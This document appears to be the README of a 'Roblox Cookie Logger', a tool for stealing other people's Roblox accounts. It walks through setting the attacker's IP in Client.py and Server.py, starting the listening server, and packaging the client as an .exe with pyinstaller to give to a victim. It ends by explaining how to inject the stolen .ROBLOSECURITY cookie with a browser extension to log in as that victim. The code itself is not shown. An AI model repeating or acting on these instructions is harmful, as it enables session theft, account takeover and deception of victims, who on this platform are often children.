# Roblox Cookie Logger

### ***Use someone else's Roblox account by getting roblox cookies between server and client using python sockets***

> ## What is roblox cookie?
> 
> ##### roblox cookie makes you log in other's accounts
> 
> ## How can I log into someone else's account with a cookie?
> 
> ##### at [roblox.com](https://roblox.com), you should change cookie value of ``.ROBLOSECURITY``
> ##### you can change cookie using [cookie editor plugin](https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm)
> ![Cookie editor preview](https://gcdnb.pbrd.co/images/RsXrm9RrJiV8.png)


# How to USE

### First of all, you should update Server and client ip

In the [Client.py](Client.py) && [Server.py](Server.py) files, change the ``'YOUR IP HERE'`` to your IP address.

> ## How to get my ip?
> #### There are many resources on the internet on how to get your IP, please refer to them.


> ## To get a Roblox cookie, you have to wait for the target to send the Roblox cookie.
> #### To turn on the server, just run [Server.py](Server.py) with python3.x


> ## Get cookie from target
> After starting the server, now we need to give the target a file from which to get the roblox cookies.
> 
> The target may not have Python installed, so you need to convert it to an .exe file.
> 
> You can use `pyinstaller` to convert it to an .exe file.
> `pyinstaller` can be installed with:
> ```
> pip install pyinstaller
> ```
> **Next, you need to run the following command to change the [Client.py](Client.py) file:**
> ```
> pyinstaller -F Client.py
> ```
> Then, you can get .exe file of Client.py from dist/ folder
> 
> #### Then give it to the target and wait for it to run while the server is running


# Updates
- You can now save received cookies as a .txt file
- More accurate cookie determination



# Help & Support

Contact to ``whrgodev#0643``
